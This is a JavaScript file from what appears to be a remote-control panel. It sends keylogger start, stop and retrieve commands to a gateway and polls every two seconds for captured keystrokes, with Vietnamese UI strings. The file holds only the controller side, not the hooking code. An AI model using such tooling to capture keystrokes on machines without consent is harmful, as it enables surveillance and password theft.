/**
 * keyloggerCommands.js - Keylogger Commands
 * Handles keylogger start, stop, retrieve, and clear commands
 */

// Nút 5: Keylog - Start
function startKeylog() {
    switchView('view-keylog', 'Nhật ký bàn phím (Keylogger)');
    sendToGateway({ command: 'KEYLOG_HOOK' });
    
    // Optimistic update: assume command will succeed
    isKeyloggerActive = true;
    updateKeylogButtons();
    logStatus("Đang bật keylogger...");
    
    // Start auto-refresh every 2 seconds to fetch keystrokes
    if (!keylogAutoRefreshTimer) {
        keylogAutoRefreshTimer = setInterval(() => {
            if (isKeyloggerActive) {
                retrieveKeylog();
            }
        }, 2000);
    }
}

// Nút 5b: Stop Keylogger
function stopKeylog() {
    sendToGateway({ command: 'KEYLOG_UNHOOK' });
    
    // Optimistic update: assume command will succeed
    isKeyloggerActive = false;
    updateKeylogButtons();
    logStatus("Đang tắt keylogger...");
    
    // Stop auto-refresh if running
    if (keylogAutoRefreshTimer) {
        clearInterval(keylogAutoRefreshTimer);
        keylogAutoRefreshTimer = null;
    }
}

// Nút 5c: Retrieve Keylog
function retrieveKeylog() {
    sendToGateway({ command: 'KEYLOG_PRINT' });
    logStatus("Đang lấy keystroke từ server...");
}

// Nút 5d: Clear Keylog Display
function clearKeylog() {
    const textArea = document.getElementById('keylog-area');
    if (textArea) {
        textArea.value = '';
        logStatus("Đã xóa màn hình keylog.");
    }
}

// Update keylog button visibility based on state
function updateKeylogButtons() {
    const btnStart = document.getElementById('btn-keylog-start');
    const btnStop = document.getElementById('btn-keylog-stop');
    const btnClear = document.getElementById('btn-keylog-clear');
    
    if (isKeyloggerActive) {
        // Keylogger is running
        if (btnStart) btnStart.style.display = 'none';
        if (btnStop) btnStop.style.display = 'block';
        if (btnClear) btnClear.style.display = 'block';
    } else {
        // Keylogger is stopped
        if (btnStart) btnStart.style.display = 'block';
        if (btnStop) btnStop.style.display = 'none';
        if (btnClear) btnClear.style.display = 'none'; // Hide clear button when keylogger is off
    }
}

